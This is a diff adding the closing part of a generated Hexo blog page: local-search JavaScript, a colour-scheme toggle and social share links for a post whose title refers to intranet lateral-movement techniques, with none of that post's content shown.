+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B8%89)PTH%26PTT%26PTK + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Fb0cb9aff%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/b0cb9aff/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
